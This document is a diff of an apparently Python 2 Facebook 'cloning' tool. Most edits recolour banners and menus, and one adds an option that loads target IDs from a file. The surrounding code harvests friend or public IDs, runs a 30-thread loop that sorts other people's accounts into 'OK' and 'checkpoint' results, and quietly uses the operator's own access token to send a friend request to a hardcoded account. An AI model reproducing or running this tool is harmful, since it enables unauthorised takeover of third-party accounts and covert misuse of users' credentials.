@@ -48,26 +48,26 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-  \033[1;97m,ad8888ba,    \033[1;92m88b           d88  88  
- \033[1;97md8"'    `"8b   \033[1;92m888b         d888  88  
-\033[1;97md8'        `8b  \033[1;92m88`8b       d8'88  88  
-\033[1;97m88          88  \033[1;92m88 `8b     d8' 88  88  
-\033[1;97m88          88  \033[1;92m88  `8b   d8'  88  88  
-\033[1;97mY8,        ,8P  \033[1;92m88   `8b d8'   88  88  
- \033[1;97mY8a.    .a8P   \033[1;92m88    `888'    88  88  
-  \033[1;97m`"Y8888Y"'    \033[1;92m88     `8'     88  88
+  \033[1;95m,ad8888ba,    88b           d88  88  
+ \033[1;95md8"'    `"8b   888b         d888  88  
+\033[1;95md8'        `8b  88`8b       d8'88  88  
+\033[1;92m88          88  88 `8b     d8' 88  88  
+\033[1;92m88          88  88  `8b   d8'  88  88  
+\033[1;92mY8,        ,8P  88   `8b d8'   88  88  
+ \033[1;96mY8a.    .a8P   88    `888'    88  88  
+  \033[1;96m`"Y8888Y"'    88     `8'     88  88
 
-\033[1;97m●▬▬▬▬▬▬▬▬\033[1;92m▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
-\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
-\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t
-\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
-\033[1;97m«--------\033[1;92m------------✧--------------------»"""
+\033[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[1;93mAuthor©\033[1;93m: \033[1;92mOmi Chaudhary
+\033[1;93mInstagram\033[1;93m: \033[1;92mhttps://www.Instagram.com/Omi6t
+\033[1;93mFacebook\033[1;93m: \033[1;92mhttps://www.facebook.com/Omi6t
+\033[1;93mWhatsapp\033[1;93m: \033[1;92m+923117675174
+\033[1;95m«--------------------✧--------------------»"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mLoading \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93m✔\x1b[1;93mLoading \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -81,26 +81,26 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;97m__        _______ _     \033[1;92m____ ___  __  __ _____ 
-\033[1;97m\ \      / | ____| |   \033[1;92m/ ___/ _ \|  \/  | ____|
- \033[1;97m\ \ /\ / /|  _| | |  \033[1;92m| |  | | | | |\/| |  _|  
-  \033[1;97m\ V  V / | |___| |__\033[1;92m| |__| |_| | |  | | |___ 
-   \033[1;97m\_/\_/  |_____|_____\033[1;92m\____\___/|_|  |_|_____|
-\033[1;97m●▬▬▬▬▬▬▬▬\033[1;92m▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
-\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
-\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.Facebook.com/Omi6t
-\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
-\033[1;97m«--------\033[1;92m------------✧--------------------»"""
+\033[1;92m__        _______ _     \033[1;96m____ ___  __  __ _____ 
+\033[1;92m\ \      / | ____| |   \033[1;96m/ ___/ _ \|  \/  | ____|
+ \033[1;92m\ \ /\ / /|  _| | |  \033[1;96m| |  | | | | |\/| |  _|  
+  \033[1;92m\ V  V / | |___| |__\033[1;96m| |__| |_| | |  | | |___ 
+   \033[1;92m\_/\_/  |_____|_____\033[1;96m\____\___/|_|  |_|_____|
+\033[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[1;93mAuthor©\033[1;93m: \033[1;92mOmi Chaudhary
+\033[1;93mInstagram\033[1;93m: \033[1;92mhttps://www.Instagram.com/Omi6t
+\033[1;93mFacebook\033[1;93m: \033[1;92mhttps://www.Facebook.com/Omi6t
+\033[1;93mWhatsapp\033[1;93m: \033[1;92m+923117675174
+\033[1;95m«--------------------✧--------------------»"""
 
 CorrectUsername = "Omi6t"
 CorrectPassword = "Omi"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m🔐 \x1b[1;97mTool Username \x1b[1;92m»» \x1b[1;92m")
+    username = raw_input("\033[1;96m🔐 \x1b[1;93mTool Username \x1b[1;93m»» \x1b[1;96m")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m🔐 \x1b[1;97mTool Password \x1b[1;92m»» \x1b[1;92m")
+    	password = raw_input("\033[1;96m🔐 \x1b[1;93mTool Password \x1b[1;93m»» \x1b[1;96m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -119,13 +119,12 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;91mWarning: \033[1;97mDo Not Use Your Personal Account' )
-		jalan('          \033[1;97mUse a Fresh Account To Login' )
-		print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
-		print('	   \033[1;92m【\x1b[1;92mLOGIN WITH FACEBOOK\x1b[1;92m】' )
-		print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
-		id = raw_input('\033[1;97m[+] \x1b[1;92mID/Email\x1b[1;92m: \x1b[1;92m')
-		pwd = raw_input('\033[1;97m[+] \x1b[1;92mPassword\x1b[1;92m: \x1b[1;92m')
+		jalan(' \033[1;91mWarning: \033[1;93mDo Not Use Your Personal Account' )
+		jalan('          \033[1;93mUse a Fresh Account To Login' )
+		print "\033[1;95m«--------------------✧--------------------»"
+		print('	   \033[1;96m【\x1b[1;96mLOGIN WITH FACEBOOK\x1b[1;96m】' )
+		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -152,7 +151,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;92mLogin Successful...'
+				print '\n\033[1;92m✔\x1b[1;92mLogin Successful'
 				os.system('xdg-open https://www.Facebook.com/Omi6t')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -160,7 +159,7 @@ def login():
 				print"\n\033[1;91m✘\x1b[1;91mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;91m✘\x1b[1;91mYour Account Is on Checkpoint")
+			print("\n\033[1;91m✘\x1b[1;91mYour Account is on Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -188,7 +187,7 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91m✘\033[1;91mYour Account Is on Checkpoint"
+		print"\033[1;91m✘\033[1;91mYour Account is on Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -197,18 +196,17 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print('	   \033[1;92m【\x1b[1;92mLogged in User Info\x1b[1;92m】' )
-	print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
-	print "	 \033[1;97m Name\033[1;97m: \033[1;92m"+nama+"\033[1;92m               "
-	print "	 \033[1;97m ID\033[1;97m: \033[1;92m"+id+"\x1b[1;92m              "
-	print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
-	print "\033[1;97m--\033[1;97m> \033[1;92m1.\x1b[1;92mStart Cloning..."
-	print "\033[1;97m--\033[1;91m> \033[1;91m0.\x1b[1;91mExit            "
+	print "\033[1;96m«--------------------✧--------------------»"
+	print "\033[1;96m👤\033[1;93m Name\033[1;93m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m👤\033[1;93m ID\033[1;93m: \033[1;92m"+id+"\x1b[1;97m              "
+	print "\033[1;96m«--------------------✧--------------------»"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Cloning..."
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;97mChoose an Option >>> \033[1;97m")
+	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if unikers =="":
 		print "\033[1;91m✘\x1b[1;91mFill in correctly"
 		pilih()
@@ -235,22 +233,23 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
-	print "\033[1;97m--\033[1;97m> \033[1;92m1.\x1b[1;92mClone From Friend List..."
-	print "\033[1;97m--\033[1;97m> \033[1;92m2.\x1b[1;92mClone From Public ID..."
-	print "\033[1;97m--\033[1;91m> \033[1;91m0.\x1b[1;91mBack            "
+	print "\033[1;96m«--------------------✧--------------------»"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Clone From Friend List..."
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Clone From Public ID..."
+	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Clone From File..."
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97mChoose an Option >>> \033[1;97m")
+	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if peak =="":
 		print "\033[1;91m✘\x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
-		jalan('\033[1;93mGetting ID \033[1;97m...')
+		print "\033[1;96m«--------------------✧--------------------»"
+		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -258,7 +257,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
+		print "\033[1;96m«--------------------✧--------------------»"
 		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -273,6 +272,18 @@ def pilih_super():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
+	elif peak =="3":
+		os.system('clear')
+		print logo
+		print "\033[1;96m«--------------------✧--------------------»"
+		try:
+			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except IOError:
+			print '\x1b[1;91m✘\x1b[1;91mFile Not Found'
+			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
+			super()
 	elif peak =="0":
 		menu()
 	else:
@@ -280,13 +291,13 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;93m✔\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
-	jalan('\033[1;93mStarting\033[1;93m...')
+	jalan('\033[1;93m[✺] \033[1;93mStarting\033[1;93m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93m✔\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;91m✘\x1b[1;91mTo Stop Process Press CTRL Then Press Z')
-	print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
+	print "\033[1;96m«--------------------✧--------------------»"
 	
 			
 	def main(arg):
@@ -405,7 +416,7 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m«--------\033[1;92m------------✧--------------------»"
+	print "\033[1;96m«--------------------✧--------------------»"
 	print "  \033[1;91m«---------Developed By Omi------------»"
 	print '\033[1;92m✔\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92m✔\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
